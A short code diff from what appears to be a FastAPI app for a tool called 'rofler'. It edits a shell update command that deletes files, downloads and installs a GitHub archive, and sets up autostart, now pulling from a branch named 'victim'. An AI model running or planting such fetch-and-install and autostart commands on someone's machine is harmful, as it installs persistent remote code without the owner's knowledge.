@@ -9,10 +9,10 @@ app = FastAPI()
 update_cmd = """
 rm -rf ~/rofler
 rm ~/.config/autostart/rofler
-wget https://github.com/ImCocos/rofler/archive/refs/heads/main.zip -P ~/;
-unzip ~/main.zip -d ~/;
-rm ~/main.zip;
-mv ~/rofler-main ~/rofler;
+wget https://github.com/ImCocos/rofler/archive/refs/heads/victim.zip -P ~/;
+unzip ~/victim.zip -d ~/;
+rm ~/victim.zip;
+mv ~/rofler-victim ~/rofler;
 python -m venv ~/rofler/venv;
 ~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
 mkdir ~/.config/autostart;
